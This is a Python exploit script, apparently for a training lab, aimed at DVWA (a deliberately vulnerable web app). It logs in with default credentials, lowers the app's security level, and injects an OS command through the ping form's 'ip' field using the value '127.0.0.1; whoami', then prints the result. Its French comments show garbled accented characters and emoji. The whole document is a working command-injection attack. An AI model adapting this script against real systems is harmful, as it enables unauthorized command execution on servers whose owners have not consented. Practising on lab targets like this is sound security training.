#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import sys

# Configuration
TARGET = "http://192.168.133.9/dvwa"
LOGIN_URL = f"{TARGET}/login.php"
SECURITY_URL = f"{TARGET}/security.php"
EXPLOIT_URL = f"{TARGET}/vulnerabilities/exec/"
USERNAME = "admin"
PASSWORD = "password"

COMMAND = "whoami"  # Ex: "id", "uname -a"

def get_token(html):
    soup = BeautifulSoup(html, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    return token_input["value"] if token_input else None

def run_exploit():
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    # V√©rifier la cible
    print(f"üåê V√©rification de la cible {TARGET} ...")
    try:
        resp = session.get(TARGET, timeout=5, verify=False)
        if resp.status_code != 200:
            print(f"‚ùå La cible a r√©pondu avec le code HTTP {resp.status_code}")
            sys.exit(1)
    except Exception as e:
        print(f"‚ùå Erreur de connexion : {e}")
        sys.exit(1)
    print("‚úÖ Cible accessible.\n")

    # Connexion
    print("üîê Connexion √† DVWA...")
    login_page = session.get(LOGIN_URL, verify=False)
    login_token = get_token(login_page.text)

    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login"
    }
    if login_token:
        login_data["user_token"] = login_token

    login_response = session.post(LOGIN_URL, data=login_data, verify=False)
    if "logout.php" not in login_response.text:
        print("‚ùå √âchec de l'authentification.")
        sys.exit(1)
    print("‚úÖ Authentification r√©ussie.\n")

    # S√©curit√© LOW
    print("üîß Passage du niveau de s√©curit√© √† 'low'...")
    sec_page = session.get(SECURITY_URL, verify=False)
    sec_token = get_token(sec_page.text)

    sec_data = {
        "security": "low",
        "seclev_submit": "Submit"
    }
    if sec_token:
        sec_data["user_token"] = sec_token

    session.post(SECURITY_URL, data=sec_data, verify=False)
    print("‚úÖ Niveau de s√©curit√© appliqu√©.\n")

    # Exploitation
    print(f"üöÄ Injection de la commande : '{COMMAND}'")
    payload = f"127.0.0.1; {COMMAND}"
    exploit_data = {
        "ip": payload,
        "submit": "submit"
    }

    exploit_response = session.post(EXPLOIT_URL, data=exploit_data, verify=False)

    print("\nüì• R√©sultat de l'injection :")
    print("-" * 50)
    soup = BeautifulSoup(exploit_response.text, "html.parser")
    pre = soup.find("pre")
    if pre:
        print(pre.text.strip())
    else:
        print("‚ö†Ô∏è R√©sultat non trouv√© dans la r√©ponse.")
        print(exploit_response.text.strip())

if __name__ == "__main__":
    run_exploit()
